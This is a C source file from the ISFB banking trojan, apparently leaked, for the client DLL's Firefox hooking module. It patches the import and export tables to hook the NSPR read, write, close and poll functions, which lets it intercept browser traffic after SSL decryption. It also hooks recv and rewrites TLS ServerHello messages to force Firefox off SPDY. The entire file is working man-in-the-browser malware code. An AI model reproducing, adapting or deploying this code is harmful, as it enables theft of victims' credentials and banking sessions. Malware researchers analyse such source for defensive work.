//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: ffhook.c
// $Revision: 349 $
// $Date: 2014-09-24 12:07:40 +0400 (Ср, 24 сен 2014) $
// description:
//	ISFB client DLL. FireFox-specific hooks.


#include "..\common\common.h"
#include "..\crm.h"
#include "parser.h"
#include "http.h"
#include "prio.h"


// ----- Hooked function -----------------------------------------------------------------------------------------------
LONG	_cdecl my_PR_Read(HANDLE fd, PCHAR buf, LONG amount);
LONG	_cdecl my_PR_Write(HANDLE fd, PCHAR buf, LONG amount);
LONG	_cdecl my_PR_Close(HANDLE fd);
LONG	_cdecl my_PR_Poll(PRPollDesc *pds, LONG npds, LONG timeout);


HOOK_FUNCTION hook_PR_Read		= {NULL, szPR_Read, &my_PR_Read, NULL};
HOOK_FUNCTION hook_PR_Write		= {NULL, szPR_Write, &my_PR_Write, NULL};
HOOK_FUNCTION hook_PR_Close		= {NULL, szPR_Close, &my_PR_Close, NULL};
HOOK_FUNCTION hook_PR_Poll		= {NULL, szPR_Poll, &my_PR_Poll, NULL};


static HOOK_DESCRIPTOR FfIatHooks[] = {
	DEFINE_HOOK(&hook_PR_Read, HF_TYPE_IAT | HF_PATCH_NAME),
	DEFINE_HOOK(&hook_PR_Write, HF_TYPE_IAT | HF_PATCH_NAME),
	DEFINE_HOOK(&hook_PR_Close, HF_TYPE_IAT | HF_PATCH_NAME)
};

static HOOK_DESCRIPTOR FfExportHooks[] = {
	DEFINE_HOOK(&hook_PR_Read, HF_TYPE_EXPORT | HF_PATCH_NAME),
	DEFINE_HOOK(&hook_PR_Write, HF_TYPE_EXPORT | HF_PATCH_NAME),
	DEFINE_HOOK(&hook_PR_Close, HF_TYPE_EXPORT | HF_PATCH_NAME)
};


// To disable SPDY support
LONG	_stdcall my_recv(SOCKET	s, PCHAR buf, LONG len, LONG flags);
typedef	LONG (_stdcall* FUNC_recv)(SOCKET s, PCHAR buf, LONG len, LONG flags);

static HOOK_FUNCTION hook_recv			= {szWsock32, (PCHAR)(ULONG_PTR)(0x10 | IMAGE_ORDINAL_FLAG), &my_recv, NULL};

static HOOK_DESCRIPTOR FfRecvHook = \
	DEFINE_HOOK(&hook_recv, HF_TYPE_IAT);


PRAPI	g_NSPR_Api = {NULL, NULL, NULL, NULL, NULL, NULL};


//
//	Attempts to load NSPR4.DLL or NSS3.DLL depending on FF version.
//	Sets appropriate export and import hooks for one of the specified DLLs.
//
WINERROR FfSetHooks(VOID)
{
	WINERROR Status = NO_ERROR;
	PHOOK_DESCRIPTOR ExportHooks, IatHooks;
	ULONG	i, NumberExportHooks, NumberIatHooks;
	HMODULE	hTargetModule;
	PCHAR	pTargetModule;

	// Trying to load NSPR4.DLL here, coz some versions of FF can load it with a delay.
	if ((hTargetModule = LoadLibraryA(pTargetModule = szNspr4)) || 
		// Starting from version 22 FF doesn't use NSPR4.DLL any more. All its' functions are moved to NSS3.DLL.
		(hTargetModule = LoadLibraryA(pTargetModule = szNss3)))
	{
		// Initializing our PR API function table
//		g_NSPR_Api.Read = (FUNC_PR_Read)GetProcAddress(hTargetModule, szPR_Read);
//		g_NSPR_Api.Write = (FUNC_PR_Write)GetProcAddress(hTargetModule, szPR_Write);
//		g_NSPR_Api.Close = (FUNC_PR_Close)GetProcAddress(hTargetModule, szPR_Close);
//		g_NSPR_Api.Poll = (FUNC_PR_Poll)GetProcAddress(hTargetModule, szPR_Poll);
		g_NSPR_Api.GetError = (FUNC_PR_GetError)GetProcAddress(hTargetModule, szPR_GetError);
		g_NSPR_Api.SetError = (FUNC_PR_SetError)GetProcAddress(hTargetModule, szPR_SetError);

		// Initializing hooks
		hook_PR_Read.HokedModule = pTargetModule;
		hook_PR_Write.HokedModule = pTargetModule;
		hook_PR_Close.HokedModule = pTargetModule;
		hook_PR_Poll.HokedModule = pTargetModule;

		// Setting hooks
		ExportHooks = (PHOOK_DESCRIPTOR)&FfExportHooks;
		IatHooks = (PHOOK_DESCRIPTOR)&FfIatHooks;
		NumberExportHooks = sizeof(FfExportHooks) / sizeof(HOOK_DESCRIPTOR);
		NumberIatHooks = sizeof(FfExportHooks) / sizeof(HOOK_DESCRIPTOR);

		if (LOBYTE(LOWORD(g_SystemVersion)) == 6 && HIBYTE(LOWORD(g_SystemVersion)) >= 2)
		{
			// There was a change in order of DllLoadNotificationCallback is called:
			//	on OSes earlier then Win8 it was called before processing target DLL import, but since Win8 it's being called after.
			// So now we unable to patch imported function names within the callback.
			// Disable patching of an exported function name.
			for (i=0; i<NumberExportHooks; i++)
				ExportHooks[i].Flags &= ~HF_PATCH_NAME;
		}

		g_HandleTable->Flags |= TF_REUSE_HANDLE;
		Status = ParserHookImportExport(IatHooks, NumberIatHooks, ExportHooks, NumberExportHooks);

		g_NSPR_Api.Close = hook_PR_Close.Original;
		g_NSPR_Api.Read = hook_PR_Read.Original;
		g_NSPR_Api.Write = hook_PR_Write.Original;
		g_NSPR_Api.Poll = hook_PR_Poll.Original;

		// Hooking wsock32!send() to disable SPDY support
		SetMultipleHooks(&FfRecvHook, 1, hTargetModule);
	}
	else
	{
		// Was unable to load neither NSPR4.DLL nor NSS3.DLL.
		ASSERT(FALSE);
		Status = ERROR_MOD_NOT_FOUND;
	}
	
	return(Status);
}


// ------ My hook functions ------------------------------------------------------------------------------------------------

LONG _cdecl my_PR_Read(
	HANDLE	fd,		// socket handle
	PCHAR	buf,	// buffer to store the bytes read
	LONG	amount	// number of bytes to read
	)
{
	LONG	Ret;
	PR_SOCKET	Ps;
	PPRFileDesc	pFileDesc;

	ENTER_HOOK();

	Ps.fd = fd;
	Ps.Api = &g_NSPR_Api;

	pFileDesc = (PPRFileDesc)fd;
	if (pFileDesc->methods->file_type == PRIO_FILE_TYPE_SSL)
		Ps.Flags = PR_SOCKET_FLAG_SSL;
	else
		Ps.Flags = 0;

	Ret = PRIO_Read(&Ps, buf, amount);

	LEAVE_HOOK();
	return(Ret);
}


LONG _cdecl my_PR_Write(
	HANDLE	fd, 
	PCHAR	buf, 
	LONG	amount
	)
{
	LONG Ret;
	PR_SOCKET	Ps;
	PPRFileDesc	pFileDesc;

	ENTER_HOOK();

	Ps.fd = fd;
	Ps.Api = &g_NSPR_Api;

	pFileDesc = (PPRFileDesc)fd;
	if (pFileDesc->methods->file_type == PRIO_FILE_TYPE_SSL)
		Ps.Flags = PR_SOCKET_FLAG_SSL;
	else
		Ps.Flags = 0;

	Ret = PRIO_Write(&Ps, buf, amount);

	LEAVE_HOOK();
	return(Ret);
}



LONG _cdecl my_PR_Poll(
	PRPollDesc *pds, 
	LONG		npds, 
	LONG		timeout
	)
{
	LONG		Ret = 0;
	ENTER_HOOK();

	Ret = PRIO_Poll(pds, npds);

	if (Ret == 0)
		Ret = (g_NSPR_Api.Poll)(pds, npds, timeout);

	LEAVE_HOOK();
	return(Ret);
}


LONG _cdecl my_PR_Close(HANDLE fd)
{
	LONG	Ret;
	PR_SOCKET	Ps;
	ENTER_HOOK();

	Ps.fd = fd;
	Ps.Api = &g_NSPR_Api;

	Ret = PRIO_Close(&Ps);

	LEAVE_HOOK();
	return(Ret);
}

//
//	This hook function is used to disable SPDY support within FF.
//	The idea is to modify recently received ServerHello message so that FF generates "Unexpected TLS extension" error
//		and attempts to connect the server without NPN extension enabled (and without SPDY).
//
LONG _stdcall my_recv(
	SOCKET	s,
	PCHAR	buf,
	LONG	len,
	LONG	flags
)
{
	LONG bRecvd, bRead;
	PHANDLE_CONTEXT Ctx = NULL;

	ENTER_HOOK();

	if (Ctx = FindHandle((HANDLE)s))
	{			
		//	There's a context already allocated for this handle
		//	Reading data from it first
		ASSERT(Ctx->cActive > 0);

		bRecvd = min(Ctx->cActive, len);

		memcpy(buf, Ctx->cBuffer + Ctx->cTotal - Ctx->cActive, bRecvd);
		if ((Ctx->cActive -= bRecvd) == 0)
			ReleaseHandle(Ctx);
		ReleaseHandle(Ctx);
	}
	else
	{
		if ((bRecvd = ((FUNC_recv)hook_recv.Original)(s, buf, len, flags)) > 0)
		{
			if ((bRead = ParserCheckReceiveDisableSpdy(buf, bRecvd)) < 0)
			{
				//	There's a part of ServerHello message received
				//	Allocating handle context and trying to load the message completely
				if (Ctx = AddHandle((HANDLE)s))
				{
					LONG bRead;
					WINERROR Status = NO_ERROR;

					memcpy(Ctx->cBuffer, buf, bRecvd);
					Ctx->cTotal = bRecvd;
					do
					{
						if ((bRead = ((FUNC_recv)hook_recv.Original)(s, Ctx->cBuffer + Ctx->cTotal, MAX_CONTENT_BUFFER_SIZE - Ctx->cTotal, flags)) > 0)
						{
							Ctx->cTotal += bRead;
							if ((bRead = ParserCheckReceiveDisableSpdy(Ctx->cBuffer, Ctx->cTotal)) >= 0)
								// We have succefully modifyed ServerHello message or an error occured (invalid message structure) 
								break;
						}
						Sleep(100);
					} while((bRead < 0) && ((Status = GetLastError()) == WSAEWOULDBLOCK));

					ASSERT(Ctx->cTotal > 0);
					ASSERT(Ctx->cActive == 0);
					ASSERT(Ctx->cTotal > bRecvd);

					if (bRead > 0)
						Ctx->cTotal = bRead;

					if ((Ctx->cActive = (Ctx->cTotal - bRecvd)) == 0)
						ReleaseHandle(Ctx);

					SetLastError(Status);
				}	// if (Ctx = AddHandle(s))
			}	// if ((bRead = ParserCheckReceiveDisableSpdy(buf, bRecvd)) < 0)
			else
			{
				if (bRead > 0)
					bRecvd = bRead;
			}
		}	// if ((bRecvd = ((FUNC_recv)hook_recv.Original)(s, buf, len, flags)) > 0)
	}

	LEAVE_HOOK();
	return(bRecvd);
}
